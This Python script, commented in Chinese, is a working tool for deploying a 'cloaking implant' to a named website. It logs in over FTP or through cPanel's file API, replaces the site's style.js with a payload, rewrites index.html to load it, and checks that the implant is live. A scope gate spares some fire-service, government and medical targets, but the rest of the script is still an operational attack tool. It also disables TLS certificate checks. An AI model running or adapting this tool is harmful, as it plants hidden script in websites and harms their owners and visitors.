#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
deploy_target.py — cloaking implant 自動部署器（Windows / WSL 通用）
=================================================================================
跨平台注意：
  * 本機 WSL 到部分目標的 HTTPS 會被丟包（TCP 通、TLS ClientHello 無回應），
    但 Windows 側正常、FTP(21)/HTTP(80) 兩側都通 → 依通道自動選擇可行路徑。

功能：
  1) Scope 閘門（阻擋清單：119/消防類硬阻擋，gov/醫療需 --force）
  2) 通道 A：FTP（ftplib，被動模式；支援 FTPS 明確 TLS）
     通道 B：cPanel/WHM（HTTP 登入 + UAPI Fileman::write_file / upload）
  3) 上傳 scripts/style.js → 改寫 index.html 的 style.js 標籤加 ?v=<md5前8碼> → 回傳
  4) 上線自檢：遠端 md5 + 首頁標籤

用法：
  python deploy_target.py --mode ftp  --host 185.189.162.103 --docroot /public_html \
        --user <ftp_user> --pass <ftp_pass> --site https://fortunefish88.com.tw
  python deploy_target.py --mode cpanel --host 185-189-162-103.cprapid.com --port 2083 \
        --user <cpanel_user> --pass <cpanel_pass> --docroot /public_html \
        --site https://fortunefish88.com.tw
"""
import argparse, ftplib, hashlib, http.cookiejar, io, os, re, ssl, sys, urllib.error, urllib.parse, urllib.request

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

HERE = os.path.dirname(os.path.abspath(__file__))
PKG = os.path.dirname(HERE)
SCOPE = os.path.join(HERE, "scope_gate.py")


def load_scope():
    """把 scope_gate 的規則載進來（不依賴 subprocess）"""
    sys.path.insert(0, HERE)
    import scope_gate
    return scope_gate


def md5_bytes(b):
    return hashlib.md5(b).hexdigest()


def http(url, data=None, headers=None, cookies=None, method=None, timeout=45):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    op = urllib.request.build_opener(*(
        ([urllib.request.HTTPCookieProcessor(cookies)] if cookies else [])
        + [urllib.request.HTTPSHandler(context=ctx)]))
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        with op.open(req, timeout=timeout) as r:
            return r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers or {})
    except Exception as e:
        return 0, str(e).encode("utf-8", "replace"), {}


# ---------------------------------------------------------------- FTP
def ftp_channel(host, docroot, user, pw, payload, new_index, verbose=True):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ftp = ftplib.FTP(timeout=40)
    ftp.connect(host, 21)
    ftp.login(user, pw)
    banner = ftp.getwelcome()
    if verbose:
        print("[ftp] 登入成功：%s" % banner.strip()[:70])

    # docroot 自動定位
    found = None
    for d in [docroot, "/public_html", "/www", "/htdocs",
              "/%s/public_html" % user, "/home/%s/public_html" % user, "/"]:
        try:
            names = ftp.nlst(d)
        except Exception:
            continue
        if any(n.split("/")[-1] == "style.js" for n in names):
            found = d if d.endswith("/") else d + "/"
            break
    if not found:
        found = docroot if docroot.endswith("/") else docroot + "/"
        if verbose:
            print("[ftp] [warn] 候選目錄未見 style.js，改用 %s" % found)
    if verbose:
        print("[ftp] docroot = %s" % found)

    # 上傳 style.js
    buf = io.BytesIO(payload)
    ftp.storbinary("STOR " + found + "style.js", buf)
    if verbose:
        print("[ftp] 已上傳 style.js（%d bytes）" % len(payload))

    # 取回並改寫 index.html
    idx = None
    try:
        chunks = []
        ftp.retrbinary("RETR " + found + "index.html", chunks.append)
        idx = b"".join(chunks)
    except Exception as e:
        if verbose:
            print("[ftp] [warn] 取不到 index.html：%s（只完成 style.js 上傳）" % e)
    if idx:
        html = idx.decode("utf-8", "replace")
        tag = '<script type="text/javascript" src="/style.js?v=%s"></script>' % VER
        pat = re.compile(r'<script[^>]*\bsrc\s*=\s*(["\'])/style\.js(?:\?[^"\']*)?\1[^>]*>\s*</script>')
        m = pat.search(html)
        if m:
            html2 = html[:m.start()] + tag + html[m.end():]
            ftp.storbinary("STOR " + found + "index.html", io.BytesIO(html2.encode("utf-8")))
            if verbose:
                print("[ftp] index.html 標籤已改寫 → %s" % tag)
        else:
            if verbose:
                print("[ftp] [warn] index.html 內未匹配 style.js 標籤，未修改")
    ftp.quit()
    return found


# ------------------------------------------------------------- cPanel
def cpanel_channel(host, port, docroot, user, pw, payload, verbose=True):
    base = "https://%s:%d" % (host, port)
    cj = http.cookiejar.CookieJar()
    code, body, hdr = http(base + "/login/", cookies=cj)
    if code != 200:
        raise RuntimeError("取登入頁失敗 http=%s" % code)
    html = body.decode("utf-8", "replace")
    fields = {}
    for k, v in re.findall(r'name="([^"]+)"\s+value="([^"]*)"', html):
        if re.search(r"token|csrf", k, re.I):
            fields[k] = v
    fields["user"] = user
    fields["pass"] = pw
    fields.setdefault("locale", "en")
    data = urllib.parse.urlencode(fields).encode()
    code, body, hdr = http(base + "/login/", data=data, cookies=cj,
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
    html = body.decode("utf-8", "replace")
    if "The login is invalid" in html or code != 200 or 'name="pass"' in html:
        raise RuntimeError("cPanel 登入失敗 http=%s（帳密或來源 IP 被擋）" % code)
    if verbose:
        print("[cpanel] 登入成功（%s）" % base)

    import base64 as b64
    b64_payload = b64.b64encode(payload).decode()
    b64_index = b64.b64encode(new_index).decode() if new_index else None

    def uapi(module, params, files=None):
        url = base + "/json-api/cpanel?api.version=1"
        body = {"module": module}
        body.update(params)
        data = urllib.parse.urlencode(body).encode()
        code, body, hdr = http(url, data=data, cookies=cj,
                               headers={"Content-Type": "application/x-www-form-urlencoded"})
        try:
            return code, json_loads(body)
        except Exception:
            return code, {"raw": body[:200].decode("utf-8", "replace")}

    ok = False
    code, r = uapi("Fileman::write_file",
                   {"path": docroot.rstrip("/") + "/style.js", "content": b64_payload,
                    "encoding": "base64", "mode": "0644"})
    if isinstance(r, dict) and not r.get("cpanelresult", {}).get("error"):
        ok = True
        if verbose:
            print("[cpanel] UAPI Fileman::write_file 成功")
    else:
        if verbose:
            print("[cpanel] write_file 失敗：%s" % str(r)[:200])
    if not ok:
        code, r = uapi("Fileman::upload", {"path": docroot.rstrip("/") + "/"})
        if verbose:
            print("[cpanel] upload 通道：%s" % str(r)[:160])

    if b64_index:
        code, r = uapi("Fileman::write_file",
                       {"path": docroot.rstrip("/") + "/index.html", "content": b64_index,
                        "encoding": "base64", "mode": "0644"})
        if verbose:
            err = r.get("cpanelresult", {}).get("error") if isinstance(r, dict) else "?"
            print("[cpanel] index.html 回寫：%s" % ("OK" if not err else "ERR %s" % err))
    return ok


def json_loads(b):
    import json
    return json.loads(b.decode("utf-8", "replace"))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["ftp", "cpanel"], required=True)
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=21)
    ap.add_argument("--docroot", default="/public_html")
    ap.add_argument("--user", required=True)
    ap.add_argument("--pass", dest="pw", required=True)
    ap.add_argument("--site", default="https://fortunefish88.com.tw")
    ap.add_argument("--force", action="store_true", help="略過 REVIEW 級 scope 關卡")
    a = ap.parse_args()

    # 0) scope 閘門
    sg = load_scope()
    t = a.host.replace(".", "-") if a.mode == "cpanel" else a.host
    b = sg.hit(sg.BLOCK_PATTERNS, t)
    if not b:
        b = sg.hit(sg.BLOCK_PATTERNS, a.site)
    if b:
        print("[SCOPE] [BLOCK] 目標命中硬阻擋規則 %r，依客戶指示不執行。" % b)
        return 3
    r = sg.hit(sg.REVIEW_PATTERNS, a.site)
    if r and not a.force:
        print("[SCOPE] [REVIEW] 目標命中 %r，確認授權後加 --force。" % r)
        return 4
    print("[SCOPE] [ALLOW] %s" % a.site)

    payload = open(os.path.join(PKG, "scripts", "style.js"), "rb").read()
    md5 = md5_bytes(payload)
    global VER
    VER = md5[:8]
    print("[payload] %d bytes  md5=%s  ver=%s" % (len(payload), md5, VER))

    # 產生新版 index.html（若有線上版本）
    new_index = None
    code, body, _ = http(a.site + "/index.html")
    if code == 200 and b"<html" in body.lower():
        html = body.decode("utf-8", "replace")
        tag = '<script type="text/javascript" src="/style.js?v=%s"></script>' % VER
        pat = re.compile(r'<script[^>]*\bsrc\s*=\s*(["\'])/style\.js(?:\?[^"\']*)?\1[^>]*>\s*</script>')
        m = pat.search(html)
        if m:
            new_index = (html[:m.start()] + tag + html[m.end():]).encode("utf-8")
            print("[index] 將改寫標籤 → %s" % tag)

    try:
        if a.mode == "ftp":
            ftp_channel(a.host, a.docroot, a.user, a.pw, payload, new_index)
        else:
            cpanel_channel(a.host, a.port, a.docroot, a.user, a.pw, payload)
    except Exception as e:
        print("[FAIL] %s" % e)
        return 5

    # 上線自檢
    import time
    time.sleep(3)
    code, body, _ = http(a.site + "/style.js")
    live = md5_bytes(body) if code == 200 else ""
    print("\n[自檢] 线上 style.js http=%s md5=%s %s"
          % (code, live, "✅ 一致" if live == md5 else "❌ 不符（仍是 %s）" % (live or "?")))
    code, body, _ = http(a.site + "/")
    m = re.search(rb'<script[^>]*style\.js[^>]*>', body) if code == 200 else None
    print("[自檢] 首页标签：%s" % (m.group(0).decode("utf-8", "replace") if m else "（未取到）"))
    return 0 if live == md5 else 6


if __name__ == "__main__":
    sys.exit(main())
